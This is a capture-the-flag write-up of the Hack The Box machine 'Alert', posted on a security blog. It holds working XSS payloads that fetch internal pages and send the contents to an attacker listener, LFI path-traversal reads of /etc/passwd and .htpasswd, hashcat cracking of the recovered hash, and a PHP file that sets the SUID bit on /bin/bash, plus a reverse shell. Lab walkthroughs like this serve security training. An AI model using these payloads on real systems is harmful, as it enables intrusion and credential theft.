<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Alert</title>
<meta name=description content="Platform: Hack The Box Link: Alert Level: Easy OS: Linux The exploitation of Alert begins with the discovery of two XSS vulnerabilities, one of which exposes a …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-alert/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Alert"><meta property="og:description" content="Platform: Hack The Box Link: Alert Level: Easy OS: Linux The exploitation of Alert begins with the discovery of two XSS vulnerabilities, one of which exposes a …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Alert/Alert.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Alert/Alert.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Alert"><meta name=twitter:description content="Platform: Hack The Box Link: Alert Level: Easy OS: Linux The exploitation of Alert begins with the discovery of two XSS vulnerabilities, one of which exposes a …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-alert/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-alert/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Alert/Alert.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-alert/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-alert/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Alert</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>March 21, 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Alert>Alert</a></li><li>Level: Easy</li><li>OS: Linux</li></ul><hr><p>The exploitation of Alert begins with the discovery of two XSS vulnerabilities, one of which exposes a Local File Inclusion (LFI) flaw. Leveraging this, we extract the contents of the <code>.htpasswd</code> file, revealing a hashed user password. After cracking the hash, we obtain valid credentials and gain an initial foothold on the target. Further system enumeration reveals an internally hosted website. We then identify the write permission to a critical directory, enabling us to access root account.</p><p>Target IP address - <code>10.10.11.44</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -Pn -p- -oA nmap/Alert {TARGET_IP}
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-03-04 11:38 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.44
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.054s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65532</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT      STATE    SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp    open     http    Apache httpd 2.4.41 <span style=color:#56b6c2>((</span>Ubuntu<span style=color:#56b6c2>))</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://alert.htb/
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>12227/tcp filtered unknown
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 48.16 seconds
</span></span></code></pre></div><p>We have two open ports:</p><ul><li>22 with SSH</li><li>80 with http and a redirection to <code>alert.htb</code></li></ul><pre tabindex=0><code>sudo echo &#34;{TARGET_IP} alert.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>At <code>http://alert.htb/</code> we find a markdown viewer.</p><p><img src=/images/HTB-Alert/alert_website.png alt="Alert maekdown viewer"></p><p>We upload a file and view it. There is also a <code>Share Markdown</code> button.</p><p><img src=/images/HTB-Alert/view_md.png alt="Share Markdown button"></p><p>We also have a few other pages: <code>Contac Us</code>, <code>About Us</code>, and <code>Donate</code>.</p><p>The <code>View Markdown</code> Button sends a POST request to <code>/visualizer.php</code>.</p><p><img src=/images/HTB-Alert/visualizer.png alt="visualizer.php request"></p><p>The <code>Share Markdown</code> option sends a GET request to <code>/visualizer.php?link_share=xxxx.xxxx.md</code>.</p><p><img src=/images/HTB-Alert/visualizer_share.png alt="Share Markdown request"></p><p>The button on the contact page sends a POST request to <code>contact.php</code> and uses two paraneters <code>email</code> and <code>message</code>.</p><p><img src=/images/HTB-Alert/alert_contact.png alt="Contact page request"></p><p>Finally the Donate page sends a POST request to <code>/index.php?page=donate</code>.</p><p><img src=/images/HTB-Alert/alert_donate.png alt="Donate page request"></p><p>We run gobuster for some directory brute forcing and find a few results</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://alert.htb/
</code></pre><p><img src=/images/HTB-Alert/alert_gobuster.png alt="Directory brute forcing"></p><p>All the directories found are inaccessible.</p><ul><li><code>http://alert.htb/uploads/</code></li></ul><p><img src=/images/HTB-Alert/uploads_dir.png alt="uploads directory"></p><ul><li><code>http://alert.htb/messages/</code></li></ul><p><img src=/images/HTB-Alert/msg_dir.png alt="messages directory"></p><ul><li><code>http://alert.htb/server-status/</code></li></ul><p><img src=/images/HTB-Alert/server_status.png alt="server_status directory"></p><p>Using ffuf we discover a subdomain: <code>statistics</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://alert.htb -H &#34;Host: FUZZ.alert.htb&#34; -ic -fc 301
</code></pre><p><img src=/images/HTB-Alert/alert_ffuf.png alt="Subdomain enumeration"></p><p>At <code>http://statistics.alert.htb/</code> we find a login page requiring a <code>username</code> and <code>password</code>.</p><p><img src=/images/HTB-Alert/statistics_subdomain.png alt="statistics subdomain login page"></p><p><code>Basic Authentication</code> is used for the user authentication. This simple authentication method is not secure on its own because the credentials are only Base64-encoded, not encrypted.</p><p><img src=/images/HTB-Alert/basic_auth.png alt="Basic authentication"></p><p>We go back to the markdown viewer. Let&rsquo;s add a XSS payload to our markdown file and try to view it.</p><pre tabindex=0><code>&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre><p><img src=/images/HTB-Alert/xss_md.png alt="XSS test"></p><p>When we view the markdown file our XSS payload gets executed!</p><p><img src=/images/HTB-Alert/alert_xss_payload.png alt="XSS payload triggered"></p><p>It also works when we share the file.</p><p><img src=/images/HTB-Alert/alert_xss_payload1.png alt="XSS payload triggered 2"></p><p>We can also test for a XSS vulnerability on the contact page.</p><pre tabindex=0><code>&lt;img src=x error= \&#34;fetch(&#39;http://IP:PORT/?kscorpio&#39;)\&#34;
</code></pre><p><img src=/images/HTB-Alert/test_XSS.png alt="XSS test on contact page"></p><p>Our payload works here too.</p><p><img src=/images/HTB-Alert/XSS_test_success.png alt="XSS on contact page success"></p><h2 id=initial-foothold>Initial Foothold</h2><p>We have confirmed two instances of XSS. Let&rsquo;s update the content of our markdown file and try to steal some sensitive data.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://IP:PORT/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><p>Even though nothing is displayed when we view our file, checking the page&rsquo;s source code confirms it is included in the page.</p><p><img src=/images/HTB-Alert/script_included.png alt="page source code"></p><p>We use the link we obtain with the <code>Share Markdown</code> button at <code>/contact</code>.</p><p><img src=/images/HTB-Alert/XSS_contact.png alt="xss payload in contact page"></p><p>After sending the message we receive a response on our web server.</p><p>We decode the URL-encoded response in Burp. Its content is the html file of the home page.</p><p><img src=/images/HTB-Alert/HTML_alert.png alt="home page source code"></p><p>Once again we modify the content of our markdown file. This time we will try to access <code>/messages</code>. We use the link such as <code>http://alert.htb/visualizer.php?link_share=xxxxxx.xxxxxx.md</code> on the contact page.</p><p>If the user triggering our payload has higher privileges we might be able to see the content of <code>/messages</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Javascript data-lang=Javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/messages.php&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://IP:PORT/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><p>On the web server we receive a response, which we decode.</p><h3 id=local-file-inclusion>Local File Inclusion</h3><p>Using Burp decoder we notice that the response is using a <code>file</code> parameter at <code>messages.php</code>.</p><p><img src=/images/HTB-Alert/file_param.png alt="file parameter at messages.php"></p><p>Let&rsquo;s try leveraging it for an LFI vulnerability.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/messages.php?file=../../../../../etc/passwd&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://IP:PORT/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><p>After decoding the response we see that the LFI works! We find two users <code>albert</code> and <code>david</code>.</p><p><img src=/images/HTB-Alert/XSS_LFI.png alt="XSS to LFI"></p><p>We remember that <code>Basic Authentication</code> is used at <code>http://statistics.alert.htb/</code>. Now that we have a working LFI we can try to read the <code>.htpasswd</code> file.</p><blockquote><p>The <code>.htpasswd</code> file in Apache stores usernames and encrypted passwords for basic HTTP authentication.</p></blockquote><p>To find its location we will read the configuration file of Apache. The most common paths are <code>/etc/apache2/apache2.conf</code> and <code>/etc/apache2/sites-available/000-default.conf</code>.</p><blockquote><p><code>apache2.conf</code> is the main configuration file while <code>000-default.conf</code> is the file defining virtual host configuration.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/messages.php?file=../../../../../etc/apache2/apache2.conf&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://IP:PORT/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><p>We read the content of <code>apache2.conf</code> but it does not mention <code>.htpasswd</code> in a relevant manner.</p><p><img src=/images/HTB-Alert/apache2.png alt="Apache2.conf file"></p><p>On the other hand <code>000-default.conf</code> reveals the location of <code>.htpasswd</code> which is <code>/var/www/statistics.alert.htb/.htpasswd</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-available/000-default.conf&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://IP:PORT/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><p><img src=/images/HTB-Alert/000-default.png alt="000-default.conf file"></p><p>So now we read the file.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://10.10.15.91:8000/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><h3 id=shell-as-albert>Shell as albert</h3><p>After decoding the response we recover <code>albert</code> password hash.</p><p><img src=/images/HTB-Alert/albert_pwd.png alt="albert password hash"></p><p>This is an Apache hash, crackable with hashcat mode <code>1600</code>.</p><pre tabindex=0><code>hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p>We recover the password <code>manchesterunited</code>.</p><p><img src=/images/HTB-Alert/albert_pass.png alt="albert password"></p><hr><p>The credentials <code>albert:manchesterunited</code> work at <code>http://statistics.alert.htb/</code> but the page only displays data about donors.</p><p><img src=/images/HTB-Alert/donors_info.png alt="Alert Dashboard"></p><hr><p>We login via SSH with those credentials and find the user flag.</p><p><img src=/images/HTB-Alert/user_flag.png alt="Foothold & user flag"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>With the <code>id</code> command we discover that <code>albert</code> is part of a group called <code>management</code>. Looking for files related to the group we find some files suggesting a tool or application for monitoring websites.</p><p><img src=/images/HTB-Alert/management_files.png alt="Files related to management group"></p><p>Inside <code>/opt/website-monitor/</code> we find more files solidifying our theory of a web-based monitoring application.</p><p><img src=/images/HTB-Alert/website_monitor_files.png alt="Website monitor files"></p><p>With <code>ps aux</code> we see that the <code>root</code> user is running the web application on port <code>8080</code>.</p><p><img src=/images/HTB-Alert/root_ps_8080.png alt="Internal website on port 8080"></p><h3 id=local-exploit>Local Exploit</h3><p>Because <code>albert</code> is part of the <code>management</code> group he has the permissions to write files into <code>/opt/website-monitor/config/</code>. So we can abuse it to gain a shell as root by setting the SUID bit on <code>/bin/bash</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PHP data-lang=PHP><span style=display:flex><span><span style=color:#56b6c2>&lt;?</span><span style=color:#e06c75>php</span> <span style=color:#e06c75>exec</span>(<span style=color:#98c379>&#34;chmod +s /bin/bash&#34;</span>); <span style=color:#7f848e>?&gt;</span>
</span></span></code></pre></div><pre tabindex=0><code>curl 127.0.0.1:8080/config/revshell.php

bash -p
</code></pre><p><img src=/images/HTB-Alert/SUID_root.png alt="SUID bit set to bash binary"></p><h3 id=reverse-shell-via-the-browser>Reverse Shell via the browser</h3><p>We can also execute a PHP reverse shell file. However we will need to set up a tunnel first.</p><pre tabindex=0><code>ssh -L {PORT}:localhost:8080 albert@IP
</code></pre><p>We indeed access a monitoring application at <code>http://localhost:{PORT}/</code>.</p><p><img src=/images/HTB-Alert/website_monitor_website.png alt="Access to internal website"></p><p>We navigate to <code>http://localhost:{PORT}/config/revshell.php</code> to execute our malicious file.</p><blockquote><p>I used the <code>PHP Ivan Sineck</code> shell on <a href=https://www.revshells.com/>revshells.com</a>.</p></blockquote><p><img src=/images/HTB-Alert/php_revshell_file.png alt="php reverse shell"></p><p>We receive a root shell on our netcat listner.</p><p><img src=/images/HTB-Alert/revshell_root.png alt="root flag"></p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-chemistry/>&#8592;
Previous:
HTB: Chemistry</a></p><p class=prev-post-date>March 7, 2025</p></div><div class=next-post><p><a href=/posts/htb-linkvortex/>Next:
HTB: LinkVortex
&#8594;</a></p><p class=next-post-date>April 11, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#local-file-inclusion>Local File Inclusion</a></li><li><a href=#shell-as-albert>Shell as albert</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#local-exploit>Local Exploit</a></li><li><a href=#reverse-shell-via-the-browser>Reverse Shell via the browser</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>